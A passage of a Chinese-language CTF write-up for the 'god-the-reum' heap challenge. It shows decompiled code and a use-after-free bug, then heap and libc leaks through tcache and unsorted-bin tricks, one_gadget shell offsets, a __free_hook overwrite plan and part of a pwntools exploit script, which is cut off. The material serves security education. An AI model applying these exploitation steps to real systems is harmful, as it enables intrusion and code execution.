+       <span class="token keyword">break</span><span class="token punctuation">;</span>
+     <span class="token keyword">case</span> <span class="token number">3u</span><span class="token punctuation">:</span>
+       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_11DC</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token function">delete_free</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token keyword">break</span><span class="token punctuation">;</span>
+     <span class="token keyword">case</span> <span class="token number">4u</span><span class="token punctuation">:</span>
+       v3 <span class="token operator">=</span> v5<span class="token punctuation">;</span>
+       <span class="token function">print_all</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token keyword">break</span><span class="token punctuation">;</span>
+     <span class="token keyword">case</span> <span class="token number">5u</span><span class="token punctuation">:</span>
+       <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye da."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+     <span class="token keyword">case</span> <span class="token number">6u</span><span class="token punctuation">:</span>
+       v3 <span class="token operator">=</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">[</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">sub_11DC</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+       <span class="token function">developer</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token keyword">break</span><span class="token punctuation">;</span>
+     <span class="token keyword">default</span><span class="token punctuation">:</span>
+       <span class="token function">sub_11B3</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token keyword">break</span><span class="token punctuation">;</span>
+</code></pre>
+<p>运行对比可以知道</p>
+<p>主要有创建、储存、删除、打印、退出、以及隐藏功能 修改地址</p>
+<h4 id="creat-size"><a href="#creat-size" class="headerlink" title="creat_size"></a>creat_size</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>s <span class="token operator">||</span> dword_20202C <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>
+  <span class="token punctuation">{</span>
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"wallet creation failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+  <span class="token function">memset</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x82uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">+</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>v1 <span class="token operator">=</span> <span class="token number">30768</span><span class="token punctuation">;</span>
+  v1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  v2 <span class="token operator">=</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"how much initial eth? : "</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%llu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  v3 <span class="token operator">=</span> size<span class="token punctuation">;</span>
+  v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span>
+    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v5<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> size<span class="token punctuation">;</span>
+  <span class="token operator">++</span>dword_20202C<span class="token punctuation">;</span>
+  <span class="token function">sub_119B</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Creating new wallet succcess !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>代码有删减 </p>
+<p>size可控 主要功能 创建一个size可控的chunk</p>
+<h4 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c">
+  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"how much you wanna withdraw? : "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%llu"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">=</span> v2<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断是否为0 如果为0则执行free</span>
+    <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//uaf</span>
+
+  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"withdraw ok !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span> <span class="token operator">^</span> v3<span class="token punctuation">;</span>
+</code></pre>
+<p>这里free以后没有清空指针 导致存在uaf漏洞</p>
+<h4 id="print-all"><a href="#print-all" class="headerlink" title="print_all"></a>print_all</h4><p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Ch] [rbp-4h]</span>
+
+<span class="token function">sub_119B</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"========== My Wallet List ============="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> dword_20202C<span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d) "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">sub_FD5</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">16LL</span> <span class="token operator">*</span> i <span class="token operator">+</span> a1 <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">return</span> <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">sub_FD5</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> _QWORD <span class="token operator">*</span>a2<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"addr : %s, ballance %llu\n"</span><span class="token punctuation">,</span> a1<span class="token punctuation">,</span> <span class="token operator">*</span>a2<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token operator">&lt;</span>p class<span class="token operator">=</span><span class="token string">"code-caption"</span> data<span class="token operator">-</span>lang<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>line_number<span class="token operator">=</span><span class="token string">"frontend"</span> data<span class="token operator">-</span>trim_indent<span class="token operator">=</span><span class="token string">"backend"</span> data<span class="token operator">-</span>label_position<span class="token operator">=</span><span class="token string">"outer"</span> data<span class="token operator">-</span>labels_left<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_right<span class="token operator">=</span><span class="token string">""</span> data<span class="token operator">-</span>labels_copy<span class="token operator">=</span><span class="token string">""</span><span class="token operator">></span><span class="token operator">&lt;</span>span class<span class="token operator">=</span><span class="token string">"code-caption-label"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+</code></pre>
+<p>打印所有chunk id 及内容</p>
+<h4 id="developer"><a href="#developer" class="headerlink" title="developer"></a>developer</h4><pre class=" language-`c"><code class="language-`c">__int64 __fastcall developer(__int64 a1)
+{
+  sub_119B(a1);
+  puts("this menu is only for developer");
+  puts("if you are not developer, please get out");
+  sleep(1u);
+  printf("new eth : ");
+  return __isoc99_scanf("%10s", *(_QWORD *)(a1 + 8)); //修改chunk
+}
+`
+</code></pre>
+<p>可以修改chunk</p>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>存在uaf漏洞 所以要从这里入手</p>
+<p>首先给定libc 2.27 存在了tcache所以leak方式需要改变</p>
+<h4 id="1、how-to-leak"><a href="#1、how-to-leak" class="headerlink" title="1、how to leak"></a>1、how to leak</h4><p>首次执行double free后 打印会泄漏出heap地址</p>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
+create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#多加一个chunk可以防止top chunk回收</span>
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#double free leak heap_base</span>
+prints<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
+heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span>
+</code></pre>
+<h5 id="调式结果"><a href="#调式结果" class="headerlink" title="调式结果"></a>调式结果</h5><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">python exp.py
+
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  how much you wanna withdraw? <span class="token keyword">:</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  withdraw ok <span class="token operator">!</span>
+
+    <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> Ethereum wallet <span class="token function">service</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
+    1. Create new wallet
+    2. Deposit eth
+    3. Withdraw eth
+    4. Show all wallets
+    5. <span class="token keyword">exit</span>
+    <span class="token keyword">select</span> your choice <span class="token keyword">:</span>
+0x564a72bee2f0
+</code></pre>
+<p>利用gdb查看当前heap地址</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmap
+LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
+    0x564a718e1000     0x564a718e3000 r-xp     2000 0      /home/ios/god-the-reum
+    0x564a71ae2000     0x564a71ae3000 r--p     1000 1000   /home/ios/god-the-reum
+    0x564a71ae3000     0x564a71ae4000 rw-p     1000 2000   /home/ios/god-the-reum
+    0x564a72bee000     0x564a72c0f000 rw-p    21000 0      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
+    0x7f92acc4d000     0x7f92ace34000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
+    0x7f92ace34000     0x7f92ad034000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
+</code></pre>
+<p>因为leak了一次heap地址填充了1次tcache 所以再次填充6次即可填满tcache 之后free掉的chunk会进入unsorted bin 接着利用print_all 打印出当前bin的fd 即可leak main_arena从而得到libc_base</p>
+<h3 id="这里需要掌握的知识"><a href="#这里需要掌握的知识" class="headerlink" title="这里需要掌握的知识"></a>这里需要掌握的知识</h3><h4 id="how-to-leak-libc"><a href="#how-to-leak-libc" class="headerlink" title="how to leak libc"></a>how to leak libc</h4><p>unsort bin是双向链表，如果只有一个chunk fd和bk都是main_arena+偏移。如果是多个就按照双向链表链起来（头和尾都是main_arena+偏移）</p>
+<p>需要利用uaf+print配合</p>
+<p>填充满tcache后查看当前heap</p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> heap
+0x563b2fd6b000 PREV_INUSE <span class="token punctuation">{</span>
+  mchunk_prev_size <span class="token operator">=</span> 0, 
+  mchunk_size <span class="token operator">=</span> 593, 
+  fd <span class="token operator">=</span> 0x0, 
+  bk <span class="token operator">=</span> 0x700000000000000, 
+  fd_nextsize <span class="token operator">=</span> 0x0, 
+  bk_nextsize <span class="token operator">=</span> 0x0
+<span class="token punctuation">}</span>
+0x563b2fd6b250 PREV_INUSE <span class="token punctuation">{</span>
+  mchunk_prev_size <span class="token operator">=</span> 0, 
+  mchunk_size <span class="token operator">=</span> 145, 
+  fd <span class="token operator">=</span> 0x3461373737367830, 
+  bk <span class="token operator">=</span> 0x3463613331616535, 
+  fd_nextsize <span class="token operator">=</span> 0x3630333238336564, 
+  bk_nextsize <span class="token operator">=</span> 0x3139613439306631
+<span class="token punctuation">}</span>
+0x563b2fd6b2e0 PREV_INUSE <span class="token punctuation">{</span>
+  mchunk_prev_size <span class="token operator">=</span> 0, 
+  mchunk_size <span class="token operator">=</span> 273, 
+  fd <span class="token operator">=</span> 0x7ffab2fc9ca0 <span class="token operator">&lt;</span>main_arena+96<span class="token operator">></span>, 
+  bk <span class="token operator">=</span> 0x7ffab2fc9ca0 <span class="token operator">&lt;</span>main_arena+96<span class="token operator">></span>, 
+  fd_nextsize <span class="token operator">=</span> 0x0, 
+  bk_nextsize <span class="token operator">=</span> 0x0
+<span class="token punctuation">}</span>
+</code></pre>
+<p>可以看到该chunk fd bk都指向main_arena+96</p>
+<p>可以利用 p main_arena查看当前main_arena_addr</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c">d0 <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">1680</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
+  binmap <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
+  next <span class="token operator">=</span> <span class="token number">0x7ffab2fc9c40</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">></span><span class="token punctuation">,</span> 
+  next_free <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  attached_threads <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> 
+  system_mem <span class="token operator">=</span> <span class="token number">135168</span><span class="token punctuation">,</span> 
+  max_system_mem <span class="token operator">=</span> <span class="token number">135168</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>可以得到main_arena</p>
+<p>利用vmmap 查看当前加载libc基地址</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token number">0x563b2fd6b000</span>     <span class="token number">0x563b2fd8c000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
+<span class="token number">0x7ffab2bde000</span>     <span class="token number">0x7ffab2dc5000</span> r<span class="token operator">-</span>xp   <span class="token number">1e7000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so
+</code></pre>
+<p>由于程序多次执行 导致地址发生变化==  此处计算offfset为同一进程 </p>
+<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> p/x 0x7ffab2fc9c40-0x7ffab2bde000
+<span class="token variable">$2</span> <span class="token operator">=</span> 0x3ebc40
+pwndbg<span class="token operator">></span>
+</code></pre>
+<p>0x7ffab2bde000 这个地址就是libc的实际加载地址，它和main_arena的偏移是固定的</p>
+<p>加载地址会变但是这个偏移是不会变的，这样可以获取到远程的libc的加载地址</p>
+<p>所以得到main_arena地址就可以计算libc_base了</p>
+<h5 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h5><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+   delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>heap_addr<span class="token punctuation">)</span>
+prints<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
+offset <span class="token operator">=</span> <span class="token number">0x3ebc40</span>
+libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>offset
+</code></pre>
+<p>这里减96时因为main_arena地址在这个位置</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c"><span class="token number">0x563b2fd6b2e0</span> PREV_INUSE <span class="token punctuation">{</span>
+  mchunk_prev_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
+  mchunk_size <span class="token operator">=</span> <span class="token number">273</span><span class="token punctuation">,</span> 
+  fd <span class="token operator">=</span> <span class="token number">0x7ffab2fc9ca0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token punctuation">,</span> 
+  bk <span class="token operator">=</span> <span class="token number">0x7ffab2fc9ca0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token punctuation">,</span> 
+  fd_nextsize <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
+  bk_nextsize <span class="token operator">=</span> <span class="token number">0x0</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>因为offset = main_arena-libc_addr </p>
+<p>所以libc_base = main_arena-offset</p>
+<h5 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h5><p>这里有个不明白的地方，在使用one_gadget时查找libc-2.28.so会直接报错 所以这里使用的libc-2.27.so进行做题的～～</p>
+<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-c"><code class="language-c">ios@Sec<span class="token punctuation">:</span><span class="token operator">~</span>$ one_gadget <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so
+<span class="token number">0x4f2c5</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
+constraints<span class="token punctuation">:</span>
+  rcx <span class="token operator">==</span> <span class="token constant">NULL</span>
+
+<span class="token number">0x4f322</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
+constraints<span class="token punctuation">:</span>
+  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span>
+
+<span class="token number">0x10a38c</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
+constraints<span class="token punctuation">:</span>
+  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span>
+ios@Sec<span class="token punctuation">:</span><span class="token operator">~</span>$
+</code></pre>
+<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>有了libc base 就可以直接修改 tcache 中的 fd，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。创建一个不大于0x408的chunk，free掉后即可进入tcache，可以修改tcache的fd为free_hook的地址，进行两次分配后，即可分配到free_hook的地址，再次使用developer的隐藏功能直接把free_hook改成onegadget即可getshell</p>
+<p>exp</p>
+<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./god-the-reum'</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'how much initial eth? :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input wallet no :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'how much you wanna withdraw? :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
